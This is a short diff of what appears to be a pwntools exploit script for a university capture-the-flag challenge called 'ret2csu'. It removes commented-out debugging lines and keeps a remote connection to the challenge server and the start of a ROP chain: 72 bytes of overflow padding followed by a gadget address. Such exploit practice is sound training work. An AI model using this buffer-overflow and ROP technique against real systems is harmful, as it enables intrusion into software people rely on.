@@ -5,21 +5,7 @@ binary = "./chal.bin"
 e = context.binary = ELF(binary)
 r = ROP(e.path)
 
-#p = process(binary)
 p = remote("cse4850-ret2csu-1.chals.io", 443, ssl=True, sni="cse4850-ret2csu-1.chals.io")
-
-#gs = 
-#break *0x40095a
-#break *0x400940
-#continue 
-
-#def start():
-#    if args.GDB:
-#        return gdb.debug(e.path, gdbscript=gs)
-#    else:
-#        return process(e.path)
-
-#p = start()
 
 chain = b'A' * 72
 chain += p64(0x40095a)		# address of first gadget
